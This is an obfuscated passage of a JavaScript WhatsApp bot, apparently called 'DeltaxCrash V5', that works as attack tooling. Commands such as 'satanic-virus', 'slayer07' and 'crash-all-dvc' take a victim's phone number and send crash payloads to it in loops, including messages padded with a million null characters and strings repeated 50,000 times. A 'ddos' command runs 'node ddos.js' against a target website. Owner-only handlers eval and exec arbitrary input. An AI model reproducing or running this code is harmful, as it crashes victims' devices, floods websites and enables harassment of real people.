                    'viewOnceMessage': {
                        'message': {
                            'interactiveMessage': {
                                'header': {
                                    'title': '',
                                    'subtitle': ' '
                                },
                                'body': {
                                    'text': _0xbcef60(0x10b)
                                },
                                'footer': {
                                    'text': _0xbcef60(0x1a5)
                                },
                                'nativeFlowMessage': {
                                    'buttons': [{
                                        'name': _0xbcef60(0x150),
                                        'buttonParamsJson': _0xbcef60(0x1d1)
                                    }],
                                    'messageParamsJson': '\x00' [_0xbcef60(0x10d)](0xf4240)
                                }
                            }
                        }
                    }
                }), {
                    'userJid': _0x3f5acb,
                    'quoted': _0x2ae8ee
                });
                await _0x17f1e9[_0xbcef60(0x215)](Pe, _0x5cf9f4['message'], {
                    'messageId': _0x5cf9f4[_0xbcef60(0x18d)]['id']
                });
            }
            _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x111));
            break;
        case 'deltaxcrashbug':
        case _0xbcef60(0x225):
        case _0xbcef60(0x243):
        case _0xbcef60(0x1ca):
        case 'deltaxcrashandro':
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global['nocreator']);
            if (!q) return _0x2ae8ee['reply'](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b['split']('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x8be600 = 0x0; _0x8be600 < amount; _0x8be600++) {
                _0x19c29a(Pe), _0x19fd36(Pe), sleep(0x1f4), _0x59b068(Pe), sleep(0x1f4), _0x342c47(Pe), sleep(0x1f4), _0x38ad94(Pe), sleep(0x1f4), _0x19c29a(Pe), sleep(0x1f4), _0x19fd36(Pe), sleep(0x1f4), _0x59b068(Pe), sleep(0x1f4), _0x342c47(Pe), sleep(0x1f4), _0x38ad94(Pe), sleep(0x1f4), _0x19c29a(Pe);
            }
            _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x18c) + _0x3ba139 + '* Amount *' + amount + '*');
            break;
        case 'ddos':
            if (!_0x492e1a) return _0x2ae8ee['reply'](global['nocreator']);
            if (!q[_0xbcef60(0x13c)](' ')) return _0x2ae8ee[_0xbcef60(0x1c5)]('*CARA PENGGUNAAN* : .' + _0x3ba139 + _0xbcef60(0x1ed) + _0x3ba139 + _0xbcef60(0x134));
            const _0x42de97 = q[_0xbcef60(0x11d)](0x0, q['indexOf'](' ') - 0x0),
                _0x1645d7 = q[_0xbcef60(0x11d)](q[_0xbcef60(0x15c)](' ') + 0x1);
            let _0x4de247 = _0xbcef60(0x1c4) + _0x42de97 + _0xbcef60(0x1db) + _0x1645d7 + ' ';
            _0x17f1e9[_0xbcef60(0x172)](_0x3f5acb, [{
                'name': _0xbcef60(0x150),
                'buttonParamsJson': JSON[_0xbcef60(0x15f)]({
                    'display_text': _0xbcef60(0x184),
                    'url': '' + _0x42de97,
                    'merchant_url': '' + _0x42de97
                })
            }], _0x2ae8ee, {
                'body': _0x4de247,
                'footer': ''
            }), _0x59a72c(_0xbcef60(0x1d4) + _0x42de97 + ' ' + _0x1645d7, {
                'maxBuffer': 0x400 * 0x400
            }, (_0x586cb6, _0x4c8e14, _0x12a059) => {
                const _0xfb2d42 = _0xbcef60;
                if (_0x586cb6) {
                    _0x2ae8ee['reply'](_0xfb2d42(0x1cd) + _0x586cb6[_0xfb2d42(0x13f)]);
                    return;
                }
                if (_0x12a059) {
                    kmreply(_0xfb2d42(0x1cd) + _0x12a059);
                    return;
                }
                _0x2ae8ee[_0xfb2d42(0x1c5)]('彡 successfully ddos panel\x0a\x0a彡 website : ' + _0x42de97 + _0xfb2d42(0x140) + _0x1645d7);
            });
            break;
        case _0xbcef60(0x12c):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee['reply'](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b['split']('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee['mentionedJid'][0x0] : _0x2ae8ee['quoted'] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x353443 = 0x0; _0x353443 < amount; _0x353443++) {
                _0x38ad94(Pe), _0x19c29a(Pe), sleep(0x1f4), _0x38ad94(Pe), _0x19c29a(Pe), sleep(0x1f4), _0x38ad94(Pe), _0x19c29a(Pe), sleep(0x1f4), _0x38ad94(Pe), _0x19c29a(Pe), sleep(0x1f4);
            }
            _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x18c) + _0x3ba139 + '* Amount *' + amount + '*');
            break;
        case _0xbcef60(0x238):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee['reply'](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)]['sender'] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x5a816e = 0x0; _0x5a816e < amount; _0x5a816e++) {
                _0x4e0965(Pe), sleep(0x1f4), _0x4e0965(Pe), _0x19c29a(Pe), sleep(0x1f4), _0x4e0965(Pe), sleep(0x1f4), _0x4e0965(Pe), _0x19c29a(Pe), sleep(0x1f4);
            }
            _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x18c) + _0x3ba139 + _0xbcef60(0x142) + amount + '*');
            break;
        case _0xbcef60(0x193):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee['reply'](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + ' 62xxxx|5');
            victim = _0x4ff88b['split']('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee['mentionedJid'][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + '@s.whatsapp.net';
            for (let _0x392e73 = 0x0; _0x392e73 < amount; _0x392e73++) {
                _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), _0x19c29a(Pe), sleep(0xc8), _0x19fd36(Pe), _0x59b068(Pe), _0x342c47(Pe), sleep(0xc8), _0xc72d47(Pe, _0x75d111), _0x19c29a(Pe), sleep(0xc8), _0x19fd36(Pe), _0x59b068(Pe), _0x342c47(Pe);
            }
            _0x2ae8ee['reply'](_0xbcef60(0x18c) + _0x3ba139 + '* Amount *' + amount + '*');
            break;
        case 'slayer07':
            if (!_0x492e1a) return _0x2ae8ee['reply'](global['nocreator']);
            if (!q) return _0x2ae8ee['reply'](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b['split']('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee['mentionedJid'][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee['quoted'][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x582b13 = 0x0; _0x582b13 < amount; _0x582b13++) {
                _0x19c29a(Pe), _0x19fd36(Pe), _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), sleep(0x1f4), _0x59b068(Pe), sleep(0x1f4), _0x342c47(Pe), sleep(0x1f4), _0x38ad94(Pe), sleep(0x1f4), _0x58f1a4(Pe, _0x54f1ba), sleep(0x1f4), _0xf83177(Pe, _0x75d111), sleep(0x1f4), _0x1ca19d(Pe, _0x75d111), _0x17f1e9[_0xbcef60(0x156)](Pe, {
                    'image': _0x54813b,
                    'caption': 'SLAYER 07'
                }, {
                    'quoted': _0x2ae8ee
                });
            }
            _0x2ae8ee['reply'](_0xbcef60(0x18c) + _0x3ba139 + _0xbcef60(0x142) + amount + '*');
            break;
        case _0xbcef60(0x186):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b['split']('|')[0x0], amount = _0x4ff88b['split']('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee['quoted'] ? _0x2ae8ee['quoted']['sender'] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x683dfe = 0x0; _0x683dfe < amount; _0x683dfe++) {
                _0x19c29a(Pe), _0x19fd36(Pe), _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), sleep(0x1f4), _0x59b068(Pe), sleep(0x1f4), _0x342c47(Pe), sleep(0x1f4), _0x38ad94(Pe), sleep(0x1f4), _0x58f1a4(Pe, _0x54f1ba), sleep(0x1f4), _0xf83177(Pe, _0x75d111), sleep(0x1f4), _0x1ca19d(Pe, _0x75d111), _0x17f1e9['sendMessage'](Pe, {
                    'document': _0x54813b,
                    'caption': _0xbcef60(0x143)
                }, {
                    'quoted': _0x2ae8ee
                });
            }
            _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x18c) + _0x3ba139 + _0xbcef60(0x142) + amount + '*');
            break;
        case _0xbcef60(0x1e8):
            if (!_0x492e1a) return _0x2ae8ee['reply'](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim['replace'](/[^0-9]/g, '') + '@s.whatsapp.net';
            for (let _0x39a9da = 0x0; _0x39a9da < amount; _0x39a9da++) {
                _0x19c29a(Pe), _0x19fd36(Pe), _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), sleep(0x1f4), _0x59b068(Pe), sleep(0x1f4), _0x342c47(Pe), sleep(0x1f4), _0x38ad94(Pe), sleep(0x1f4), _0x58f1a4(Pe, _0x54f1ba), sleep(0x1f4), _0xf83177(Pe, _0x75d111), sleep(0x1f4), _0x1ca19d(Pe, _0x75d111), _0x17f1e9[_0xbcef60(0x156)](Pe, {
                    'image': _0x54813b,
                    'caption': _0xbcef60(0x20b)
                }, {
                    'quoted': _0x2ae8ee
                });
            }
            _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x18c) + _0x3ba139 + '* Amount *' + amount + '*');
            break;
        case _0xbcef60(0x226):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee['quoted'][_0xbcef60(0x152)] : victim['replace'](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x2015e5 = 0x0; _0x2015e5 < amount; _0x2015e5++) {
                _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), _0x19c29a(Pe), sleep(0xc8), _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), _0x342c47(Pe), sleep(0xc8), _0xc72d47(Pe, _0x75d111), _0x19c29a(Pe), sleep(0xc8), _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), _0x342c47(Pe);
            }
            _0x2ae8ee[_0xbcef60(0x1c5)]('彡 Oke nice successfully send bug *' + _0x3ba139 + '* Amount *' + amount + '*');
            break;
        case _0xbcef60(0x161):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global['nocreator']);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b['split']('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee['quoted'] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x530339 = 0x0; _0x530339 < amount; _0x530339++) {
                _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), _0x19c29a(Pe), _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), _0x342c47(Pe), _0xc72d47(Pe, _0x75d111), _0x19c29a(Pe), _0xc72d47(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), _0x342c47(Pe), sleep(0xc8);
            }
            _0x2ae8ee[_0xbcef60(0x1c5)]('彡 Oke nice successfully send bug *' + _0x3ba139 + _0xbcef60(0x142) + amount + '*');
            break;
        case 'satanic-virus':
        case _0xbcef60(0x23d):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee['quoted'] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x4eebbc = 0x0; _0x4eebbc < amount; _0x4eebbc++) {
                _0xf83177(Pe, _0x75d111), sleep(0xc8), _0xc72d47(Pe, _0x75d111), sleep(0xc8), _0xc72d47(Pe, _0x75d111), sleep(0xc8), _0xf83177(Pe, _0x75d111), sleep(0xc8), _0xf83177(Pe, _0x75d111), sleep(0xc8), _0xc72d47(Pe, _0x75d111), sleep(0xc8), _0xc72d47(Pe, _0x75d111), sleep(0xc8), _0xf83177(Pe, _0x75d111), sleep(0xc8), _0xc72d47(Pe, _0x75d111), sleep(0xc8), _0xc72d47(Pe, _0x75d111), sleep(0xc8), _0xf83177(Pe, _0x75d111), sleep(0xc8), _0xf83177(Pe, _0x75d111), sleep(0xc8), _0xc72d47(Pe, _0x75d111), sleep(0xc8), _0xc72d47(Pe, _0x75d111), sleep(0xc8);
            }
            _0x2ae8ee['reply']('彡 Oke nice successfully send bug *' + _0x3ba139 + '* Amount *' + amount + '*');
            break;
        case _0xbcef60(0x15a):
            if (!_0x492e1a) return _0x2ae8ee['reply'](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x11f) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim['replace'](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x2f2374 = 0x0; _0x2f2374 < amount; _0x2f2374++) {
                _0x342c47(Pe), _0xf83177(Pe, _0x75d111), _0xc72d47(Pe, _0x75d111), _0x19c29a(Pe), _0x38ad94(Pe), sleep(0xc8), _0x342c47(Pe), _0x58f1a4(Pe, _0x54f1ba), _0x19c29a(Pe), _0x59b068(Pe), sleep(0x7d0);
            }
            _0x2ae8ee['reply']('彡 Oke nice successfully send bug *' + _0x3ba139 + '* Amount *' + amount + '*');
            break;
        case _0xbcef60(0x116):
            if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](global[_0xbcef60(0x248)]);
            if (!q) return _0x2ae8ee[_0xbcef60(0x1c5)]('彡 Contoh :\x0a ' + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x17d));
            victim = _0x4ff88b['split']('|')[0x0], amount = _0x4ff88b[_0xbcef60(0x11e)]('|')[0x1], Pe = _0x2ae8ee[_0xbcef60(0x1f6)][0x0] ? _0x2ae8ee[_0xbcef60(0x1f6)][0x0] : _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)][_0xbcef60(0x152)] : victim[_0xbcef60(0x201)](/[^0-9]/g, '') + _0xbcef60(0x162);
            for (let _0x1a100c = 0x0; _0x1a100c < amount; _0x1a100c++) {
                _0x342c47(Pe), _0x38ad94(Pe), sleep(0x64), _0xc72d47(Pe, _0x75d111), _0x58f1a4(Pe, _0x54f1ba), sleep(0x64), _0x19c29a(Pe), _0x59b068(Pe), _0xf83177(Pe, _0x75d111), _0x342c47(Pe), _0x38ad94(Pe), sleep(0x64), _0xc72d47(Pe, _0x75d111), _0x58f1a4(Pe, _0x54f1ba), sleep(0x64), _0x19c29a(Pe), _0x59b068(Pe), _0xf83177(Pe, _0x75d111);
            }
            _0x2ae8ee['reply'](_0xbcef60(0x18c) + _0x3ba139 + '* Amount *' + amount + '*');
            break;
        default:
            if (_0x4c5417[_0xbcef60(0x1dc)]('=>')) {
                if (!_0x492e1a) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x10c));

                function _0x104321(_0x787da9) {
                    const _0x5416b1 = _0xbcef60;
                    return sat = JSON[_0x5416b1(0x15f)](_0x787da9, null, 0x2), bang = util[_0x5416b1(0x144)](sat), sat == undefined && (bang = util[_0x5416b1(0x144)](_0x787da9)), _0x2ae8ee['reply'](bang);
                }
                try {
                    _0x2ae8ee[_0xbcef60(0x1c5)](util[_0xbcef60(0x144)](eval('(async () => { return ' + _0x4c5417['slice'](0x3) + _0xbcef60(0x14d))));
                } catch (_0x3f0dac) {
                    _0x2ae8ee[_0xbcef60(0x1c5)](String(_0x3f0dac));
                }
            }
            if (_0x4c5417[_0xbcef60(0x1dc)]('>')) {
                if (!_0x492e1a) return;
                try {
                    let _0x28922e = await eval(_0x4c5417[_0xbcef60(0x1f0)](0x2));
                    if (typeof _0x28922e !== _0xbcef60(0x119)) _0x28922e = require(_0xbcef60(0x16e))[_0xbcef60(0x153)](_0x28922e);
                    await _0x2bc9ce(_0x28922e);
                } catch (_0x481aca) {
                    await _0x2bc9ce(String(_0x481aca));
                }
            }
            if (_0x4c5417[_0xbcef60(0x1dc)]('$')) {
                if (!_0x492e1a) return;
                require(_0xbcef60(0x217))[_0xbcef60(0x196)](_0x4c5417[_0xbcef60(0x1f0)](0x2), (_0x18688f, _0x2c884d) => {
                    if (_0x18688f) return _0x2bc9ce('' + _0x18688f);
                    if (_0x2c884d) return _0x2bc9ce(_0x2c884d);
                });
            }
        }
    } catch (_0x5552e5) {
        _0x17f1e9['sendMessage'](_0x2ae8ee['chat'], {
            'text': require(_0xbcef60(0x16e))[_0xbcef60(0x144)](_0x5552e5)
        }, {
            'quoted': _0x2ae8ee
        }), console[_0xbcef60(0x1e1)]('\x1b[1;31m' + _0x5552e5 + _0xbcef60(0x1a6));
    }
};

function _0x14aa() {
    const _0x579382 = ['pow', 'selectedButtonId', 'getInfo', 'audio/mpeg', '2135021YiyQbM', '.mp3', ' \x0a彡 waktu penyerangan : ', 'startsWith', 'Message', '*fully sending bug to ', 'penis', '10116', 'log', 'bugparamsin', 'error-next', '\x0aVideo Duration 1-9 Seconds', 'https://', './lib/image/slayer07.jpg', 'conversation', 'satanic-69', 'https://chat.whatsapp.com/', '50%', 'Asia/Jakarta', 'audioonly', ' <target> <waktu>\x0a\x0aContoh : .', 'attackv3', 'toLowerCase', 'slice', 'extendedTextMessage', 'https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3', 'there-xill', 'audio/mp4', '*</> Successfully sending bug to ', 'mentionedJid', 'ddos  *<website> <duration>*\x0a╘───────────────┈⳹\x0a', '{ display_text : \'deltaxcrash\', url : , merchant_url :  }', 'videoMessage', 'deltaxcrash', 'review_and_pay', 'BUG LOCATION', 'bughomegc', 'satanic-69 *+628xxx|Amount*\x0a│彡 ', 'decodeJid', 'mtype', 'replace', 'singleSelectReply', 'listResponseMessage', 'house-bug *+628xxx|Amount*\x0a│彡 ', './lib/video/bug1.mp4', 'bugvid2', ' Please pause for 3 minutes*', '999999999', 'tourl', 'waUploadToServer', 'satanic-69 WhatsApp ✅', 'body', 'cache', '12720CAIvbK', 'not-human *Id Grup|Amount*\x0a│彡 ', 'FBPAY', '120363222395675670@newsletter', '8gDrICR', 'resolve', 'deltaxcrashReaction', 'relayMessage', 'delluser', 'child_process', 'test', 'readFileSync', '彡 Oke nice successfully send bug to ', ' EB', 'axios', './lib/virtex/virus', 'ê¦¾', 'crypto', '1715881084144', 'fs-extra', ' https://youtube.com/watch?v=PtFMh6Tccag%2', '@g.us', 'Footer', 'deltaxcrashkeren', 'samsungfull', 'ytdl-core', 'video', 'No Name', '彡 Oke nice successfully send bug ', 'create', 'baileys1', 'foto', '{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}', '. Please pause commenting for 3 minutes 🤗', 'finish', 'location *+628xxx|Amount*\x0a│彡 ', 'jsdom', 'chalk', 'global_search_new_chat', 'Body', 'DEFAULT', '*彡 Oke nice successfully send bug to ', 'iosfullv2', 'Video will be sent via private chat ( *PC* )', 'CHANGED_IN_CHAT', '彡 masukan nomor tujuan\x0a\x0a彡Contoh 6283123456789', 'cek?', 'satanic-virus2', 'there-xill *+628xxx*\x0a│彡 ', '5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=', ' 12xxxx|5', 'deltaxcrashCrash', '10%', 'deltaxcrashganteng', '😈DELTA TECH😈', 'query', '4392524570816732', 'deltaxcrash💸', 'nocreator', '24RMeTBj', 'FUCK OFF', '*Only Vip*', 'repeat', 'performance-now', '732764uSrOoO', './lib/virtex/virgam.jpeg', '</> Succes', 'messageContextInfo', 'fire-virus *+628xxx|Amount*\x0a│彡 ', '*_彡 Successfully send bug_*', ' 628xxxx|5', 'crash-all-dvc', 'lol', 'deltaxcrash Official', 'string', 'isGroup', ' 50663646464', '1.1.1.1.11', 'substring', 'split', '彡 Contoh :\x0a ', 'user', '*.*', '\x0a╒─⩽ `𝗠𝗘𝗡𝗨 𝗢𝗪𝗡𝗘𝗥 𝗗𝗘𝗟𝗧𝗔𝗖𝗥𝗔𝗦𝗛 𝗩𝟱 - 𝗠𝟱` ⩾\x0a│彡 self\x0a│彡 public \x0a│彡 addprem\x0a│彡 dellprem\x0a╘───────────────┈⳹\x0a\x0a╒─────⩽ *𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨* ⩾\x0a│彡 bugmenu\x0a│彡 sticker\x0a╘───────────────┈⳹\x0a', './deltaImage.jpg', '120363144038483540@newsletter', 'error-404', ' TB', '*</> Successfully sent a bug. Please pause for 3 minutes*', 'INITIATED_BY_ME', 'successfully...', 'deltaxcrash Reaction??', 'content', 'iosfull', 'length', '😈DELTA TECH', '›          #彡deltaxcrash', 'push', 'bugaudiogc', '彡deltaxcrash', '1715880173', ' deltaxcrash.my.id 50', 'Sukse Change To Self', 'Photos will be sent via private chat ( *PC* )', 'https://telegra.ph/file/8ec35256d43c71bfb8078.jpg', 'quoted', 'msg', 'Link?', 'self', 'includes', 'HH:mm:ss z', 'createWriteStream', 'message', ',\x0a彡 waktu : ', 'CHAT_SETTING', '* Amount *', 'satanic-xill 㐅', 'format', 'status@broadcast', 'indexOf', '*彡 Oke nice successfully send bug. Please pause commenting for 3 minutes 🤗', 'pino', 'location', 'participant', ' Number\x0a彡 Contoh  ', 'https://youtube.com/@deltatech.i', ' })()', 'splice', 'satanic-virus2 *+628xxx|Amount*\x0a│彡 ', 'cta_url', 'catch', 'sender', 'inspect', 'not-found *Id Grup*\x0a│彡 ', 'Nama pengirim : ', 'sendMessage', 'house-bug', 'random', 'map', 'bug-brutal', 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½', 'lastIndexOf', 'match', 'parse', 'stringify', 'footer', 'samsung-brutal', '@s.whatsapp.net', ' Has Been Added to Premium!!!', '⚡  *+628xxx|Amount*\x0a│彡 ', '1239240XOGpAr', ' Has Been Removed From Premium!!!', 'error-404  *Id Grup*\x0a│彡 ', './lib/video/bug2.mp4', '*</> Successfully submitted bug to group ', 'attrs', 'sticker2', 'CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=', 'imageMessage', 'util', 'templateButtonReplyMessage', '1317204ycGJIF', 'ytmp3', 'sendButton', 'sendPresenceUpdate', 'Number ', ' to group ', 'anunaki-virus *+628xxx|Amount*\x0a│彡 ', './lib/upload', 'selectedId', '彡 Contoh  ', 'Header', 'undefined', 'Reply to Video/Image With Caption ', ' 62xxxx|5', 'writeFileSync', 'getidgrup', 'substr', 'virtexpc', 'download', 'locale', 'PERIKSA WEBSITE', '\x1b[0;32m', 'satanic-xill', 'invite', 'r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=', 'InteractiveMessage', '100%', 'pipe', '彡 Oke nice successfully send bug *', 'key', 'one-xill', '2046588cBzdwK', 'now', '彡 masukan id groupnya', 'pushName', 'samsungcrash', '80%', '0@s.whatsapp.net', 'exec', '1397605HwLZWv', 'fluent-ffmpeg', 'Insert id Target', './lib/storage', 'paptt', ' \x1b[1;32mupdated!\x1b[0m', 'single_select', 'unlinkSync', 'groupMetadata', 'Use ', 'sendImageAsSticker', 'error-next  *Id Grup*\x0a│彡 ', ' 62xxxxxxxxxx|5', 'prefa', '›彡deltaxcrash', '\x1b[0m', 'bugmenu', 'trim', ' GB', 'two-xill', '30%', 'exports', 'Link Invalid', 'public', 'floor', 'buttonsResponseMessage', '/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0', 'downloadAndSaveMediaMessage', 'unwatchFile', ' foto/video', 'get', ' KB', 'recording', 'text', '.com', 'selectedRowId', ' to number ', 'w:g2', 'sendVideoAsSticker', 'watchFile', 'anunaki-virus', 'chat', 'caption', 'Sukse Change To Public', 'fromObject', '*DELTACRASH V5 ATTACKS WEBSITE PANEL*\x0a彡 website target : ', 'reply', './lib/user.json', 'remoteJid', 'join', 'addprem', 'deltaxcrashios', 'brokenv3', '\x0a waktu : ', 'Error: ', 'IYA IN', 'sticker', 'https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true', '{ display_text : \'deltaxcrashBugWhatsApp\', url : , merchant_url :  }', 'àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®', '\x0a╒─────⩽ *𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧* ⩾\x0a│彡 creator : delta\x0a│彡 version : 5.0\x0a╘───────────────┈⳹\x0a\x0a╒─⩽ `𝗕𝗨𝗚 𝗩𝟱 - 𝗠𝟱` ⩾\x0a│彡 ', 'node ddos.js '];
    _0x14aa = function () {
        return _0x579382;
    };
    return _0x14aa();
}

function _0x13eb(_0x429c0a, _0x4bda13) {
    const _0x14aaa5 = _0x14aa();
    return _0x13eb = function (_0x13ebe7, _0x153368) {
